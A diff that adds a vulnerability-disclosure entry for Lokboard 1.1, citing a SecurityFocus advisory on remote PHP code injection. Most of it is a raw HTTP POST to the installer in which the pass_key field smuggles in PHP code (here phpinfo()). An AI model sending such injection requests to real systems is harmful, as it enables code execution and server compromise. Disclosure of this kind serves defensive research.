@@ -1,0 +1,20 @@
+source: http://www.securityfocus.com/bid/60459/info
+
+Lokboard is prone to a remote PHP code-injection vulnerability.
+
+An attacker can exploit this issue to inject and execute arbitrary PHP code in the context of the affected application. This may facilitate a compromise of the application and the underlying system; other attacks are also possible.
+
+Lokboard 1.1 is vulnerable; other versions may also be affected. 
+
+POST /lokboard/install/index_4.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/lokboard/install/index_3.php?error=1
+Cookie: lang=; PHPSESSID=g4j89f6110r4hpl3bkecfpc7c1
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 90
+host=localhost&user=root&pass=toor&name=lokboard&pass_key=1234";phpinfo();// 
